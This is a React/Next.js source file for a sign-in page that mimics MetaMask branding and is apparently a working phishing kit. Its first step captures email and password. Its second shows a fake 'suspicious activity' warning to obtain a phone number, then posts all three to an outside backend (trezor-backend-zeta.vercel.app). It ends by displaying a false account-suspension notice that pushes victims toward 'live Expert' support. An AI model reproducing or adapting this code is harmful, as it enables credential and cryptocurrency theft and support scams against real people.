"use client";
import Image from "next/image";
import img from "../assets/image1.png";
import Logo from "../assets/logo2.svg";
import { useState } from "react";
import {
  EyeIcon,
  EyeSlashIcon,
  ExclamationCircleIcon,
} from "@heroicons/react/24/outline";
import axios from "axios";
import PhoneInput from "react-phone-number-input";
import "react-phone-number-input/style.css";

import orbitLines from "../assets/orbit-lines.png";
import logo11 from "../assets/logo-1-1.png";
import logo12 from "../assets/logo-1-2.png";
import logo13 from "../assets/logo-1-3.png";
import logo14 from "../assets/logo-1-4.png";
import logo15 from "../assets/logo-1-5.png";
import logo21 from "../assets/logo-2-1.png";
import logo22 from "../assets/logo-2-2.png";
import logo23 from "../assets/logo-2-3.png";
import logo24 from "../assets/logo-2-4.png";
import logo25 from "../assets/logo-2-5.png";

export default function HomePage() {
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [alert, setAlert] = useState<{
    type: "success" | "error";
    message: string;
  } | null>(null);
  const [step, setStep] = useState(1);
  const [message, setMessage] = useState(
    "some suspicious activity found with your account. Enter phone number to verify your identity"
  );

  const [formData, setFormData] = useState({
    email: "",
    password: "",
    phone: "",
  });

  // Handle input changes
  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  // Handle Step 1 submit
  const handleSubmitStep1 = (e: React.FormEvent) => {
    e.preventDefault();
    setAlert(null);
    setLoading(true);

    try {
      const data = {
        email: formData.email,
        password: formData.password,
      };

      localStorage.setItem("userInfo", JSON.stringify(data));

      // Go to next step
      setStep(2);
      // Always show red message at Step 2 start
      setAlert({
        type: "error",
        message:
          "Important message!: some suspicious activity found with your account. Enter phone number to verify your identity",
      });
    } catch (err) {
      console.error(err);
      setAlert({
        type: "error",
        message: "Failed to save data. Please try again.",
      });
    } finally {
      setLoading(false);
    }
  };

  // Handle Step 2 submit
  const handleSubmitStep2 = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      const stored = JSON.parse(localStorage.getItem("userInfo") || "{}");
      const data = {
        title: "Uphold",
        ...stored,
        phone: formData.phone,
      };

      const response = await axios.post(
        "https://trezor-backend-zeta.vercel.app/api/v1/send-user-info",
        data
      );

      localStorage.removeItem("userInfo");
    } catch (err) {
      console.error(err);
      setAlert({
        type: "error",
        message: "Failed to verify your identity. Please try again.",
      });
    } finally {
      setMessage(
        "Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately, Chat with our live Expert to unblock your account."
      );
      setLoading(false);
    }
  };

  return (
    <div className="h-screen w-full overflow-hidden flex justify-center items-center ">
      <div className=" w-full flex h-full">
        {/* Left Section */}
        <div className="flex flex-col w-[33%] relative bg-[#121314] pt-16">
          <div className="px-16 space-y-10">
            <img src="/logo.svg" alt="Logo" width="277px" />
            <h2 className="text-[36px] leading-10 font-bold text-white mb-3">
              Welcome back! Let’s get building.
            </h2>
            <p
              className="text-[20px] pt-3 font-medium"
              style={{ color: "#9ca1af" }}
            >
              Get the high availability blockchain APIs and developer tools you
              need to succeed.
            </p>
          </div>
 <div className="absolute -bottom-50 left-0 w-full">
      <div className="relative m-auto flex items-center justify-center" style={{ height: "480px" }}>
        {/* Orbit lines */}
        <span className="orbit-lines orbit-lines-0 absolute opacity-30 animate-spin-slow">
          <img src={orbitLines.src} alt="Orbit Lines" width="600" height="600" />
        </span>
        <span className="orbit-lines orbit-lines-1">
          <img src={orbitLines.src} alt="Orbit Lines" width="400" height="400" />
        </span>
        <span className="orbit-lines orbit-lines-2 absolute">
          <img src={orbitLines.src} alt="Orbit Lines" width="400" height="400" />
        </span>

        {/* First orbit logos */}
        <div className="orbit-logos orbit-logos-1 absolute">
          {[logo11, logo12, logo13, logo14, logo15].map((logo, i) => (
            <span
              key={i}
              className="expand-orbit-1"
              style={{ transform: `rotate(${i * 72}deg)` }}
            >
              <span className="rotate-counter">
                <img
                  src={logo.src}
                  alt={`Orbit Logo ${i + 1}`}
                  width="50"
                  height="50"
                  style={{ transform: `rotate(-${i * 72}deg)` }}
                />
              </span>
            </span>
          ))}
        </div>

        {/* Second orbit logos */}
        <div className="orbit-logos orbit-logos-2 absolute">
          {[logo21, logo22, logo23, logo24, logo25].map((logo, i) => (
            <span
              key={i}
              className="expand-orbit-2"
              style={{ transform: `rotate(${i * 72}deg)` }}
            >
              <span className="rotate">
                <img
                  src={logo.src}
                  alt={`Orbit Logo ${i + 1}`}
                  width="50"
                  height="50"
                  style={{ transform: `rotate(-${i * 72}deg)` }}
                />
              </span>
            </span>
          ))}
        </div>

        {/* Center circle */}
        <span className="absolute h-28 w-28 rounded-full bg-gray-900"></span>
      </div>
    </div>
          {/* <div className="bg-gray-200 h-64 md:h-80 rounded-lg flex items-center justify-center overflow-hidden">
            <Image
              src={img}
              alt="Investment Illustration"
              className="object-cover w-full h-full rounded-lg"
              style={{ background: "red" }}
            />
          </div> */}
        </div>

        {/* Right Section */}
        <div className="bg-black w-[67%] h-full flex flex-col justify-between relative pt-8 overflow-auto pb-5">
            <div className="space-y-2 text-sm w-[71%] self-center py-5">
            <h2 className="text-[36px] font-bold text-white">Sign in</h2>
                <div className="text-[#9ca1af] hover:bg-white hover:border-white hover:text-[#8B99FE] uppercase flex border-[1px] mt-8 border-[#858b9a33] justify-center items-center py-2.5 space-x-2">
                  <img src="/cat.svg" alt="Logo" />
                  <span className="tracking-wider">Install MetaMask</span>
                </div>
                <div className="flex space-x-5 mt-5 items-center">
                  <div className="h-[1px] w-full bg-[#858b9a]"></div>
                  <span className="text-[#858b9a] font-semibold">or</span>
                  <div className="h-[1px] w-full bg-[#858b9a]"></div>
                </div>
                <div className="flex space-x-5 justify-center items-center mt-5">
                  <div className="border-[1px] rounded-xl border-[#8B99FE] w-[114px] h-[45px] flex justify-center items-center hover:bg-[#8B99FE]">
                    <img src="/google.svg" alt="google" width={"16px"} />
                  </div>
                  <div className="border-[1px] rounded-xl border-[#8B99FE] w-[114px] h-[45px] flex justify-center items-center hover:bg-[#8B99FE]">
                    <img src="/git.svg" alt="git" width={"16px"} />
                  </div>
                  <div className="border-[1px] rounded-xl border-[#8B99FE] w-[114px] h-[45px] flex justify-center items-center hover:bg-[#8B99FE]">
                    <img src="/apple.svg" alt="apple" width={"16px"} />
                  </div>
                  <div className="border-[1px] rounded-xl border-[#8B99FE] w-[114px] h-[45px] flex justify-center items-center hover:bg-[#8B99FE]">
                    <img src="/x.svg" alt="x" width={"16px"} />
                  </div>
                  <div className="border-[1px] rounded-xl border-[#8B99FE] w-[114px] h-[45px] flex justify-center items-center hover:bg-[#8B99FE]">
                    <img src="/discord.svg" alt="discord" width={"16px"} />
                  </div>
                  <div className="border-[1px] rounded-xl border-[#8B99FE] w-[114px] h-[45px] flex justify-center items-center hover:bg-[#8B99FE]">
                    <img src="/facebook.svg" alt="facebook" width={"16px"} />
                  </div>
                </div>
                <div className="flex space-x-5 mt-5 items-center">
                  <div className="h-[1px] w-full bg-[#858b9a]"></div>
                  <span className="text-[#858b9a] font-semibold">or</span>
                  <div className="h-[1px] w-full bg-[#858b9a]"></div>
                </div>
                {/* {alert && (
                  <div
                    className={`mt-4 text-sm p-2 rounded-md ${
                      alert.type === "success"
                        ? "bg-green-100 text-green-700 border border-green-300"
                        : "bg-red-100 text-red-700 border border-red-300"
                    }`}
                  >
                    {alert.message}
                    
                  </div>
                )} */}
                </div>
          {step === 1 ? (
            // Step 1: Email & Password
            <form
              onSubmit={handleSubmitStep1}
              className="flex flex-col justify-between h-full"
            >
              <div className="space-y-2 text-sm w-[71%] self-center">
                <div className="space-y-16 mt-15">
                  {/* Email */}
                  <div
                    className="relative w-full border-2 rounded-lg text-sm focus-within:border-[#919eb5]"
                    style={{ borderColor: "#919eb5" }}
                  >
                    <label
                      className="absolute -top-9 -left-1 px-1 text-[18px] font-medium"
                      style={{ color: "white" }}
                    >
                      Email
                    </label>
                    <input
                      type="email"
                      name="email"
                      placeholder="Enter your email"
                      value={formData.email}
                      onChange={handleChange}
                      className="w-full py-3 text-lg px-3 border-none outline-none focus:ring-0 text-white placeholder-[#919eb5] bg-transparent"
                      required
                    />
                  </div>

                  {/* Password */}
                  <div
                    className="relative w-full border-2 rounded-lg text-sm focus-within:border-[#919eb5]"
                    style={{ borderColor: "#919eb5" }}
                  >
                    <label
                      className="absolute -top-9 -left-1 px-1 text-[18px] font-medium"
                      style={{ color: "white" }}
                    >
                      Password
                    </label>
                    <input
                      type={showPassword ? "text" : "password"}
                      name="password"
                      placeholder="Enter your password"
                      value={formData.password}
                      onChange={handleChange}
                      className="w-full py-3 px-3 text-lg border-none outline-none focus:ring-0 text-white placeholder-[#919eb5] bg-transparent"
                      required
                    />
                    <button
                      type="button"
                      className="absolute right-3 top-3 text-[#919eb5] cursor-pointer"
                      onClick={() => setShowPassword(!showPassword)}
                    >
                      {showPassword ? (
                        <EyeSlashIcon className="h-5 w-5" />
                      ) : (
                        <EyeIcon className="h-5 w-5" />
                      )}
                    </button>
                  </div>
                </div>
                <div className="text-end">
                  <span className="text-[#8B99FE] font-semibold">
                    Forget your password
                  </span>
                </div>{" "}
                <button
                  type="submit"
                  disabled={loading}
                  className={`w-fit py-3 mt-6 px-4 rounded-xl text-sm font-medium transition-all duration-200 ${
                    loading
                      ? "bg-green-400 cursor-not-allowed"
                      : "bg-[#8B99FE] hover:bg-[#8B99EE] cursor-pointer"
                  } text-black`}
                >
                  {loading ? "Processing..." : "Sign in with email"}
                </button>
                <div className="h-[1px] w-[85%] mt-5 bg-[#858b9a] mb-8"></div>
                <span className="text-lg text-[#9ca1af]">
                  Not a part of the MetaMask family yet?{" "}
                  <span className="text-[#8B99FE]">Sign up today</span>
                </span>
              </div>
            </form>
          ) : (
            // Step 2: Phone Input
            <form
              onSubmit={handleSubmitStep2}
              className="flex flex-col  h-full relative gap-4 pt-8 w-[67%] self-center"
            >
              {/* Alert at top — normal flow */}
              <div className="w-full self-center text-sm p-3 rounded-md text-center border border-red-300 bg-red-100 text-red-700 flex items-center justify-center gap-2">
                <span>{`Important message!: ${message}`}</span>
              </div>

              <div className="">
                <div
                  className="relative border-2 rounded-lg mt-10"
                  style={{ borderColor: "#919eb5" }}
                >
                  <label
                    className="absolute -top-9 -left-1 px-1 text-[14px] font-medium"
                    style={{ color: "white" }}
                  >
                    Phone Number
                  </label>
                  <PhoneInput
                    international
                    defaultCountry="IN"
                    value={formData.phone}
                    onChange={(value) =>
                      setFormData((prev) => ({ ...prev, phone: value || "" }))
                    }
                    className="w-full py-3 text-lg px-3 bg-transparent text-white placeholder-[#919eb5]"
                    style={{
                      border: "none",
                      outline: "none",
                      boxShadow: "none",
                      backgroundColor: "transparent",
                    }}
                  />
                </div>
              </div>

              <button
                type="submit"
                disabled={loading || !formData.phone}
                className={`w-full py-2 rounded-full mt-6 text-sm font-medium transition-all duration-200 ${
                  loading
                    ? "bg-green-400 cursor-not-allowed"
                    : "bg-[#8B99FE] hover:bg-[#8B99FE00] cursor-pointer"
                } text-white`}
              >
                {loading ? "Sending..." : "Submit"}
              </button>
            </form>
          )}
        </div>
      </div>
    </div>
  );
}
